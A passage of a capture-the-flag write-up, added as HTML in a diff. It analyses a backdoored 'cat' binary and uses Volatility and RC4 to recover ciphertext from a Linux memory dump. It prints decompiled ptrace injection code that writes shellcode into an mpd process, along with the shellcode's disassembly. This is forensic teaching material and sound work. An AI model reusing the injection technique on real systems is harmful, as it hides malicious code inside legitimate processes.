+        <span class="n">uVar2</span> <span class="o">=</span> <span class="o">*</span><span class="n">puVar5</span><span class="p">;</span>
+        <span class="n">lVar1</span> <span class="o">=</span> <span class="n">lVar4</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">puVar5</span><span class="p">;</span>
+        <span class="n">puVar5</span> <span class="o">=</span> <span class="n">puVar5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKETEXT</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">__pid</span><span class="p">,</span><span class="n">lVar1</span><span class="p">,</span><span class="n">uVar2</span><span class="p">);</span>
+      <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">puVar5</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">local_30</span><span class="p">);</span>
+      <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">__pid</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">uVar8</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>we now see calls to <code class="language-plaintext highlighter-rouge">ptrace()</code>, references to <code class="language-plaintext highlighter-rouge">/usr/bin/mpd</code>, and a mysterious <code class="language-plaintext highlighter-rouge">&amp;DAT_00108a40</code> variable. uh oh!</p>
+
+<p>let’s go over the functionality of this <code class="language-plaintext highlighter-rouge">initialize()</code> snippet. it starts with this check:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iVar3 = strcmp(param_1,"4 - Criminal.txt");
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">param_1</code> is the first argument that gets passed into <code class="language-plaintext highlighter-rouge">cat</code>, and this is comparing it with a known value <code class="language-plaintext highlighter-rouge">4 - Criminal.txt</code>. if the argument matches, then we execute the rest of the backdoor, otherwise we do nothing.</p>
+
+<p>afterwards:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">iVar3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">uVar8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n\n\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">__pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+    <span class="n">local_6e8</span> <span class="o">=</span> <span class="s">"/usr/bin/mpd"</span><span class="p">;</span>
+    <span class="n">uStack_6e0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">uVar8</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
+      <span class="n">lVar4</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">lVar4</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">uVar8</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">execve</span><span class="p">(</span><span class="s">"/usr/bin/mpd"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_6e8</span><span class="p">,(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">waitpid</span><span class="p">(</span><span class="n">__pid</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_6ec</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+      <span class="n">lVar4</span> <span class="o">=</span> <span class="n">get_entry_point</span><span class="p">(</span><span class="n">__pid</span><span class="p">);</span>
+      <span class="n">lVar4</span> <span class="o">=</span> <span class="n">lVar4</span> <span class="o">-</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">puVar5</span><span class="p">;</span>
+      <span class="k">do</span> <span class="p">{</span>
+        <span class="n">uVar2</span> <span class="o">=</span> <span class="o">*</span><span class="n">puVar5</span><span class="p">;</span>
+        <span class="n">lVar1</span> <span class="o">=</span> <span class="n">lVar4</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">puVar5</span><span class="p">;</span>
+        <span class="n">puVar5</span> <span class="o">=</span> <span class="n">puVar5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKETEXT</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">__pid</span><span class="p">,</span><span class="n">lVar1</span><span class="p">,</span><span class="n">uVar2</span><span class="p">);</span>
+      <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">puVar5</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">local_30</span><span class="p">);</span>
+      <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">__pid</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">uVar8</span><span class="p">;</span>
+<span class="err">}</span>
+</code></pre></div></div>
+
+<p>it’s a lot of code but in summary:</p>
+<ul>
+  <li>the process gets forked.</li>
+  <li>the child waits until it gets ptraced by the parent.</li>
+  <li>the child process spawns a new <code class="language-plaintext highlighter-rouge">/usr/bin/mpd</code> instance (music player daemon).</li>
+  <li>the parent finds the PID of the child process, and _replaces the instructions that the <code class="language-plaintext highlighter-rouge">mpd</code> process will execute with its own shellcode defined in <code class="language-plaintext highlighter-rouge">&amp;DAT_00108a40</code>.</li>
+</ul>
+
+<p>essentially, we are hiding our shellcode in the <code class="language-plaintext highlighter-rouge">mpd</code> process. cool! now:</p>
+
+<h3 id="stage-4-what-is-the-shellcode-doing">STAGE 4: WHAT IS THE SHELLCODE DOING</h3>
+
+<p>first let’s dump it.</p>
+
+<p><img src="https://i.imgur.com/yP3CDut.png" alt="im" /></p>
+
+<p>we essentially just go into Ghidra, highlight the whole thing, go to Copy Special &gt; Python Bytestring, and paste. then, we write a little wrapper to save it to a file.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">b</span> <span class="o">=</span> <span class="p">[...</span> <span class="nb">bytes</span> <span class="p">...]</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'shellcode.bin'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+<span class="n">shellcode</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>and now we can disassemble it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>~/Downloads/hissss<span class="o">)</span> <span class="o">&gt;</span> ndisasm <span class="nt">-b</span> 64 shellcode.bin
+00000000  488D3DF9FFFFFF    lea rdi,[rel 0x0]
+00000007  4881E700F0FFFF    and rdi,0xfffffffffffff000
+0000000E  B80A000000        mov eax,0xa
+00000013  BE00400000        mov esi,0x4000
+00000018  BA07000000        mov edx,0x7
+0000001D  0F05              syscall
+0000001F  488D1D82020000    lea rbx,[rel 0x2a8]
+00000026  488D350F000000    lea rsi,[rel 0x3c]
+0000002D  4889DF            mov rdi,rbx
+00000030  B96C020000        mov ecx,0x26c
+00000035  F3A4              rep movsb
+00000037  E96C020000        jmp 0x2a8
+0000003C  B802000000        mov eax,0x2
+00000041  488D3DCF010000    lea rdi,[rel 0x217]
+00000048  BE02000000        mov esi,0x2
+0000004D  4831D2            xor rdx,rdx
+00000050  0F05              syscall
+00000052  4885C0            <span class="nb">test </span>rax,rax
+00000055  0F8822010000      js 0x17d
+0000005B  4989C4            mov r12,rax
+0000005E  B800000000        mov eax,0x0
+00000063  4C89E7            mov rdi,r12
+00000066  488D352A010000    lea rsi,[rel 0x197]
+0000006D  BA80000000        mov edx,0x80
+00000072  0F05              syscall
+00000074  4989C5            mov r13,rax
+00000077  B808000000        mov eax,0x8
+0000007C  4C89E7            mov rdi,r12
+0000007F  4831F6            xor rsi,rsi
+00000082  4831D2            xor rdx,rdx
+00000085  0F05              syscall
+00000087  B801000000        mov eax,0x1
+0000008C  4C89E7            mov rdi,r12
+0000008F  488D3592010000    lea rsi,[rel 0x228]
+00000096  BA80000000        mov edx,0x80
+0000009B  0F05              syscall
+0000009D  B84A000000        mov eax,0x4a
+000000A2  4C89E7            mov rdi,r12
+000000A5  0F05              syscall
+000000A7  6A00              push qword 0x0
+000000A9  6A3C              push qword 0x3c
+000000AB  4889E7            mov rdi,rsp
+000000AE  4831F6            xor rsi,rsi
+000000B1  B823000000        mov eax,0x23
+000000B6  0F05              syscall
+000000B8  4883C410          add rsp,0x10
+000000BC  4881EC00010000    sub rsp,0x100
+000000C3  4889E7            mov rdi,rsp
+000000C6  4831C9            xor rcx,rcx
+000000C9  880C0F            mov <span class="o">[</span>rdi+rcx],cl
+000000CC  48FFC1            inc rcx
+000000CF  4881F900010000    cmp rcx,0x100
+000000D6  75F1              jnz 0xc9
+000000D8  4831C9            xor rcx,rcx
+000000DB  4D31C0            xor r8,r8
+000000DE  488D35A2000000    lea rsi,[rel 0x187]
+000000E5  4889C8            mov rax,rcx
+000000E8  4883E00F          and rax,0xf
+000000EC  480FB61C06        movzx rbx,byte <span class="o">[</span>rsi+rax]
+000000F1  480FB6040F        movzx rax,byte <span class="o">[</span>rdi+rcx]
+000000F6  4901C0            add r8,rax
+000000F9  4901D8            add r8,rbx
+000000FC  4981E0FF000000    and r8,0xff
+00000103  4A0FB61C07        movzx rbx,byte <span class="o">[</span>rdi+r8]
+00000108  881C0F            mov <span class="o">[</span>rdi+rcx],bl
+0000010B  42880407          mov <span class="o">[</span>rdi+r8],al
+0000010F  48FFC1            inc rcx
+00000112  4881F900010000    cmp rcx,0x100
+00000119  75CA              jnz 0xe5
+0000011B  4831C9            xor rcx,rcx
+0000011E  4D31C0            xor r8,r8
+00000121  4D31C9            xor r9,r9
+00000124  488D356C000000    lea rsi,[rel 0x197]
+0000012B  4C39E9            cmp rcx,r13
+0000012E  7D3C              jnl 0x16c
+00000130  49FFC0            inc r8
+00000133  4981E0FF000000    and r8,0xff
+0000013A  4A0FB60407        movzx rax,byte <span class="o">[</span>rdi+r8]
+0000013F  4901C1            add r9,rax
+00000142  4981E1FF000000    and r9,0xff
+00000149  4A0FB61C0F        movzx rbx,byte <span class="o">[</span>rdi+r9]
+0000014E  42881C07          mov <span class="o">[</span>rdi+r8],bl
+00000152  4288040F          mov <span class="o">[</span>rdi+r9],al
+00000156  4801D8            add rax,rbx
+00000159  4825FF000000      and rax,0xff
+0000015F  480FB61C07        movzx rbx,byte <span class="o">[</span>rdi+rax]
+00000164  301C0E            xor <span class="o">[</span>rsi+rcx],bl
+00000167  48FFC1            inc rcx
+0000016A  EBBF              jmp 0x12b
+0000016C  4881C400010000    add rsp,0x100
+00000173  B803000000        mov eax,0x3
+00000178  4C89E7            mov rdi,r12
+0000017B  0F05              syscall
+0000017D  B83C000000        mov eax,0x3c
+00000182  4831FF            xor rdi,rdi
+00000185  0F05              syscall
+00000187  66                o16
+00000188  657463            gs jz 0x1ee
+0000018B  68626F6C74        push qword 0x746c6f62
+00000190  637574            movsxd esi,dword <span class="o">[</span>rbp+0x74]
+00000193  7465              jz 0x1fa
+00000195  7273              jc 0x20a
+</code></pre></div></div>
+
+<p>at this point we’re satisfied with ourselves and we don’t really feel like reading assembly so we can just chuck this into an LLM and have it provide a decompilation for us.</p>
+
+<p><img src="https://i.imgur.com/nemjS09.png" alt="shellcode" /></p>
+
+<p>thanks Gemini! so our shellcode is creating a <code class="language-plaintext highlighter-rouge">RWX</code> page, reading ciphertext from a file on disk, zeroing out the file on disk, and then slowly decrypting the file. <strong>because</strong> the ciphertext is not present anywhere on the hard-disk, we will need to actually locate it from the memory dump itself. which finally leads us to the last step:</p>
+
+<h3 id="stage-3-dealing-w-the-memory-dump">STAGE 3: DEALING W/ THE MEMORY DUMP</h3>
+
+<p>volatility is very finicky with Linux memory dumps. we will need something called a symbol table, which is how volatility is able to know where things are.</p>
+
+<p>we first need to know the kernel version, which is located in <code class="language-plaintext highlighter-rouge">/boot</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>ep-to-dream/dist/mnt/boot<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">ls
+</span>config-6.12.57+deb13-amd64
+grub
+initrd.img-6.12.57+deb13-amd64
+System.map-6.12.57+deb13-amd64
+vmlinuz-6.12.57+deb13-amd64
+</code></pre></div></div>
+
+<p>we then need to find volatility symbols for that version of linux, <code class="language-plaintext highlighter-rouge">6.12.57+deb13</code>. thankfully enough there is an existing pre-generated table <a href="https://github.com/Abyss-W4tcher/volatility3-symbols/tree/master/Debian/amd64/6.12.57%2Bdeb13">here</a>, but some versions may or may not have symbol tables readily available. in that case, you will have to make your own, which is frankly a tedious and annoying process that i don’t like doing.</p>
+
+<p>after we have symbols downloaded properly, we just put it in a <code class="language-plaintext highlighter-rouge">symbols/linux</code> directory in our current working directory, and run <code class="language-plaintext highlighter-rouge">vol -f mem.dmp -s symbols [plugin we want to use]</code>. in this case, we just start with <code class="language-plaintext highlighter-rouge">linux.pslist</code>, which gives us a list of all running processes at the time of the dump.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Volatility 3 Framework 2.26.2
+Progress:  100.00		Stacking attempts finished            
+OFFSET <span class="o">(</span>V<span class="o">)</span>	PID	TID	PPID	COMM	UID	GID	EUID	EGID	CREATION TIME	File output
+
+0x90b1c0260000	1	1	0	systemd	0	0	0	0	2025-12-10 06:19:21.109905 UTC	Disabled
+0x90b1c0263080	2	2	0	kthreadd	0	0	0	0	2025-12-10 06:19:21.109905 UTC	Disabled
+0x90b1c0266100	3	3	2	pool_workqueue_	0	0	0	0	2025-12-10 06:19:21.217905 UTC	Disabled
+...
+...
+...
+0x90b1c63d9840	764	764	1	mpd	1000	1000	1000	1000	2025-12-10 06:28:00.553613 UTC	Disabled
+</code></pre></div></div>
+
+<p>there is a lot of stuff i had to excise but we can see our <code class="language-plaintext highlighter-rouge">mpd</code> process down there! great. we now know that its pid is <code class="language-plaintext highlighter-rouge">764</code>, so let’s dump its entire memory space with <code class="language-plaintext highlighter-rouge">linux.proc.Maps</code>.</p>
+
+<p>however, if we do this, we’ll find ourselves very quickly spammed with a whole lot of memory pages. this is because <code class="language-plaintext highlighter-rouge">mpd</code> is a dynamically linked binary that has to load a lot of different libraries into its own memory space at runtime, so there is a Lot Of Nonsense that we have to filter out. how do we know which memory page has the specific shellcode we want?</p>
+
+<p>with permissions! each memory page has a different set of permissions (read, write, execute), and because of the Linux kernel, <strong>ordinary pages can never be write + execute at the same time</strong>. but since the shellcode used <code class="language-plaintext highlighter-rouge">mprotect</code> to create a <code class="language-plaintext highlighter-rouge">RWX</code> page, we can just dump the <em>SINGLE</em> RWX page present in memory.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>tf-setting/sleep-to-dream<span class="o">)</span> <span class="o">&gt;</span> vol <span class="nt">-s</span> symbols <span class="nt">-f</span> mem.dmp linux.proc.Maps <span class="nt">--pid</span><span class="o">=</span>764 | <span class="nb">grep </span>rwx
+mpd 100.00x564f5bc47000	0x564f5bc4b000pt rwx	0x62000	8	1	1077557	/usr/bin/mpd	Disabled
+</code></pre></div></div>
+
+<p>then, we just dump this page.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>tf-setting/sleep-to-dream<span class="o">)</span> <span class="o">&gt;</span> vol <span class="nt">-s</span> symbols <span class="nt">-f</span> mem.dmp <span class="nt">-o</span> coredump linux.proc.Maps <span class="nt">--pid</span><span class="o">=</span>764 <span class="nt">--dump</span>
+Volatility 3 Framework 2.26.2
+Progress:  100.00		Stacking attempts finished            
+PID	Process	Start	End	Flags	PgOff	Major	Minor	Inode	File Path	File output
+
+764	mpd	0x564f5bbe5000	0x564f5bc15000	r--	0x0	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bbe5000-0x564f5bc15000.dmp
+764	mpd	0x564f5bc15000	0x564f5bc47000	r-x	0x30000	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bc15000-0x564f5bc47000.dmp
+764	mpd	0x564f5bc47000	0x564f5bc4b000	rwx	0x62000	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bc47000-0x564f5bc4b000.dmp
+764	mpd	0x564f5bc4b000	0x564f5bd69000	r-x	0x66000	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bc4b000-0x564f5bd69000.dmp
+764	mpd	0x564f5bd69000	0x564f5bdca000	r--	0x184000	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bd69000-0x564f5bdca000.dmp
+764	mpd	0x564f5bdca000	0x564f5bdd8000	r--	0x1e5000	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bdca000-0x564f5bdd8000.dmp
+764	mpd	0x564f5bdd8000	0x564f5bdd9000	rw-	0x1f3000	8	1	1077557	/usr/bin/mpd	pid.764.vma.0x564f5bdd8000-0x564f5bdd9000.dmp
+764	mpd	0x564f5bdd9000	0x564f5be1a000	rw-	0x0	0	0	0	Anonymous Mapping	pid.764.vma.0x564f5bdd9000-0x564f5be1a000.dmp
+764	mpd	0x564f93fd9000	0x564f94047000	rw-	0x0	0	0	0	<span class="o">[</span>heap]	pid.764.vma.0x564f93fd9000-0x564f94047000.dmp
+764	mpd	0x7f4187fc1000	0x7f4187fee000	rw-	0x0	0	0	0	Anonymous Mapping	pid.764.vma.0x7f4187fc1000-0x7f4187fee000.dmp
+764	mpd	0x7f4187fee000	0x7f4187fef000	r--	0x0	8	1	1077256	/usr/lib/x86_64-linux-gnu/samba/libcluster-private-samba.so.0	pid.764.vma.0x7f4187fee000-0x7f4187fef000.dmp
+...
+
+navi@curette <span class="o">(</span>g/sleep-to-dream/coredump<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">ls</span> | <span class="nb">head                   
+</span>pid.764.vma.0x564f5bbe5000-0x564f5bc15000.dmp
+pid.764.vma.0x564f5bc15000-0x564f5bc47000.dmp
+pid.764.vma.0x564f5bc47000-0x564f5bc4b000.dmp
+pid.764.vma.0x564f5bc4b000-0x564f5bd69000.dmp
+pid.764.vma.0x564f5bd69000-0x564f5bdca000.dmp
+pid.764.vma.0x564f5bdca000-0x564f5bdd8000.dmp
+pid.764.vma.0x564f5bdd8000-0x564f5bdd9000.dmp
+pid.764.vma.0x564f5bdd9000-0x564f5be1a000.dmp
+pid.764.vma.0x564f93fd9000-0x564f94047000.dmp
+pid.764.vma.0x7f4187fc1000-0x7f4187fee000.dmp
+</code></pre></div></div>
+
+<p>we’ve learned that our page in question is at the addresses <code class="language-plaintext highlighter-rouge">0x564f5bc47000-0x564f5bc4b000</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette (g/sleep-to-dream/coredump) &gt; ls | grep 0x564f5bc47000
+pid.764.vma.0x564f5bc15000-0x564f5bc47000.dmp
+pid.764.vma.0x564f5bc47000-0x564f5bc4b000.dmp
+</code></pre></div></div>
+
+<p>so, we isolate that specific dump and delete the rest! indeed, after looking at this dump, we can see our shellcode:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">00000e70</span><span class="o">:</span> <span class="mo">0100</span> <span class="mo">00</span><span class="n">b8</span> <span class="mo">0300</span> <span class="mo">0000</span> <span class="mi">4</span><span class="n">c89</span> <span class="n">e70f</span> <span class="mo">05</span><span class="n">b8</span> <span class="mi">3</span><span class="n">c00</span>  <span class="p">........</span><span class="n">L</span><span class="p">.....</span><span class="o">&lt;</span><span class="p">.</span>
+<span class="mf">00000e80</span><span class="o">:</span> <span class="mo">0000</span> <span class="mi">4831</span> <span class="n">ff0f</span> <span class="mo">0566</span> <span class="mi">6574</span> <span class="mi">6368</span> <span class="mi">626</span><span class="n">f</span> <span class="mi">6</span><span class="n">c74</span>  <span class="p">..</span><span class="n">H1</span><span class="p">...</span><span class="n">fetchbolt</span>
+<span class="mf">00000e90</span><span class="o">:</span> <span class="mi">6375</span> <span class="mi">7474</span> <span class="mi">6572</span> <span class="mi">732</span><span class="n">e</span> <span class="n">a274</span> <span class="n">f799</span> <span class="mi">0</span><span class="n">ec0</span> <span class="n">bfda</span>  <span class="n">cutters</span><span class="p">..</span><span class="n">t</span><span class="p">......</span>
+<span class="mo">00000</span><span class="n">ea0</span><span class="o">:</span> <span class="mi">796</span><span class="n">c</span> <span class="mi">5800</span> <span class="n">dc73</span> <span class="n">bccb</span> <span class="mi">4825</span> <span class="mi">5</span><span class="n">ed1</span> <span class="mi">70</span><span class="n">a1</span> <span class="mi">0</span><span class="n">c42</span>  <span class="n">ylX</span><span class="p">..</span><span class="n">s</span><span class="p">..</span><span class="n">H</span><span class="o">%^</span><span class="p">.</span><span class="n">p</span><span class="p">..</span><span class="n">B</span>
+<span class="mo">00000</span><span class="n">eb0</span><span class="o">:</span> <span class="n">e273</span> <span class="mi">8029</span> <span class="mi">0</span><span class="n">a23</span> <span class="n">bd22</span> <span class="n">af9b</span> <span class="mi">2</span><span class="n">fd7</span> <span class="mi">80</span><span class="n">c3</span> <span class="n">f6d6</span>  <span class="p">.</span><span class="n">s</span><span class="p">.).</span><span class="err">#</span><span class="p">.</span><span class="s">"../.....</span><span class="err">
+</span><span class="s">00000ec0: baca f223 ae71 50a0 b965 826e d7a8 5663  ...#.qP..e.n..Vc</span><span class="err">
+</span><span class="s">00000ed0: 2b1c 4e49 f9df 428e 6ee4 29bc 6e8f 03ed  +.NI..B.n.).n...</span><span class="err">
+</span><span class="s">00000ee0: ff22 c8c3 0df4 1731 a0e1 ffc8 6280 ce26  ."</span><span class="p">.....</span><span class="mi">1</span><span class="p">....</span><span class="n">b</span><span class="p">..</span><span class="o">&amp;</span>
+<span class="mo">00000</span><span class="n">ef0</span><span class="o">:</span> <span class="n">aa08</span> <span class="mi">2</span><span class="n">df0</span> <span class="mi">7551</span> <span class="mi">28</span><span class="n">fd</span> <span class="mi">4141</span> <span class="n">f7ae</span> <span class="mi">891</span><span class="n">f</span> <span class="mi">7097</span>  <span class="p">..</span><span class="o">-</span><span class="p">.</span><span class="n">uQ</span><span class="p">(.</span><span class="n">AA</span><span class="p">....</span><span class="n">p</span><span class="p">.</span>
+<span class="mo">00000</span><span class="n">f00</span><span class="o">:</span> <span class="mi">128</span><span class="n">b</span> <span class="mi">15</span><span class="n">ad</span> <span class="mi">2</span><span class="n">c06</span> <span class="mi">82</span><span class="n">b4</span> <span class="n">a1b1</span> <span class="n">e1aa</span> <span class="mi">4</span><span class="n">baf</span> <span class="mi">29</span><span class="n">aa</span>  <span class="p">....,.......</span><span class="n">K</span><span class="p">.).</span>
+<span class="mo">00000</span><span class="n">f10</span><span class="o">:</span> <span class="mi">51</span><span class="n">b8</span> <span class="mi">7298</span> <span class="mi">7</span><span class="n">f9c</span> <span class="mi">2334</span> <span class="mi">202</span><span class="n">d</span> <span class="mi">2043</span> <span class="mi">7269</span> <span class="mi">6</span><span class="n">d69</span>  <span class="n">Q</span><span class="p">.</span><span class="n">r</span><span class="p">...</span><span class="err">#</span><span class="mi">4</span> <span class="o">-</span> <span class="n">Crimi</span>
+<span class="mo">00000</span><span class="n">f20</span><span class="o">:</span> <span class="mf">6e61</span> <span class="mi">6</span><span class="n">c2e</span> <span class="mi">7478</span> <span class="mi">7400</span> <span class="mo">0000</span> <span class="mo">0000</span> <span class="mo">0000</span> <span class="mo">0000</span>  <span class="n">nal</span><span class="p">.</span><span class="n">txt</span><span class="p">.........</span>
+</code></pre></div></div>
+
+<p>and we can see our ciphertext as well. recall that this is the ONLY PLACE in memory where this ciphertext exists! (it’s between the <code class="language-plaintext highlighter-rouge">fetchboltcutters</code> string and the <code class="language-plaintext highlighter-rouge">4 - Criminal.txt</code>) string.</p>
+
+<p>recall that our shellcode was just decrypting this ciphertext in memory via RC4, so we can just decrypt it ourselves, too as we have the key and ciphertext. first we’ll actually need to isolate the ciphertext from the dump.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dump</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'this-one.dmp'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'fetchboltcutters'</span>
+<span class="n">ciphertext</span> <span class="o">=</span> <span class="n">dump</span><span class="p">[</span><span class="n">dump</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">):</span><span class="n">dump</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s">'4 - '</span><span class="p">)]</span>
+<span class="k">print</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">.</span><span class="nb">hex</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>which gives us our ciphertext:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>navi@curette <span class="o">(</span>g/sleep-to-dream/coredump<span class="o">)</span> <span class="o">&gt;</span> python solve.py
+2ea274f7990ec0bfda796c5800dc73bccb48255ed170a10c42e27380290a23bd22af9b2fd780c3f6d6bacaf223ae7150a0b965826ed7a856632b1c4e49f9df428e6ee429bc6e8f03edff22c8c30df41731a0e1ffc86280ce26aa082df0755128fd4141f7ae891f7097128b15ad2c0682b4a1b1e1aa4baf29aa51b872987f9c23
+</code></pre></div></div>
+
+<p>then, we just steal some implementation of RC4 from online and win.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">rc4_keystream</span><span class="p">(</span><span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
+    <span class="c1"># KSA
+</span>    <span class="n">S</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
+    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">key_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
+        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+
+    <span class="c1"># PRGA
+</span>    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
+        <span class="n">j</span> <span class="o">=</span> <span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span>
+        <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">],</span> <span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+        <span class="n">K</span> <span class="o">=</span> <span class="n">S</span><span class="p">[(</span><span class="n">S</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">S</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">]</span>
+        <span class="k">yield</span> <span class="n">K</span>
+
